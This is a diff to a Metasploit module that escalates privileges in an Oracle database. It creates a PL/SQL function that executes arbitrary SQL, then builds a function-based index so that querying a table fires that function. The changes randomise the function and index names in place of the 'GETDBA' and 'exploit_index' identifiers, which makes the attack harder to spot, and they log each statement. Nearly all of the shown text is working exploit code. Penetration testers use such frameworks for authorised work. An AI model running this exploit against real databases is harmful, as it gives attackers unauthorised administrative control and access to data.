@@ -33,11 +33,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    return if !check_dependencies
+    return unless check_dependencies
 
-    name = Rex::Text.rand_text_alpha(rand(5) + 1)
+    randomizer = Rex::Text.rand_text_alpha(6..12)
+    func_name = "#{randomizer}" + Rex::Text.rand_text_alpha(2..6)
 
-    func_name = "GETDBA_#{datastore['DBUSER']}_#{name}"
     create_function = "
       CREATE OR REPLACE FUNCTION #{func_name}
       (FOO varchar) return varchar
@@ -46,14 +46,15 @@ class MetasploitModule < Msf::Auxiliary
       begin
       execute immediate '#{datastore['SQL']}';
       commit;
-      return 'PWNED';
+      return '';
       end;
       "
 
-    index_name = "exploit_index__#{datastore['DBUSER']}_#{name}"
+    index_name = "#{randomizer}" + Rex::Text.rand_text_alpha(2..6)
+    param_value = Rex::Text.rand_text_alpha(2..6)
     create_index = "
       CREATE INDEX #{index_name} ON
-      #{datastore['TABLE']}(#{datastore['DBUSER']}.GETDBA_#{datastore['DBUSER']}_#{name}('BAR'))"
+      #{datastore['TABLE']}(#{datastore['DBUSER']}.#{func_name}('#{param_value}'))"
 
     trigger = "SELECT * FROM #{datastore['TABLE']}"
 
@@ -64,14 +65,19 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       print_status("Attempting to create function #{func_name}...")
+      print_status(create_function)
       prepare_exec(create_function)
       print_status("Attempting to create index #{index_name}...")
+      print_status(create_index)
       prepare_exec(create_index)
       print_status("Querying to trigger function...")
+      print_status(trigger)
       prepare_exec(trigger)
       print_status("Cleaning up index...")
+      print_status(clean_index)
       prepare_exec(clean_index)
       print_status("Cleaning up function...")
+      print_status(clean_func)
       prepare_exec(clean_func)
       print_status("Exploit complete!")
     rescue ::OCIError => e
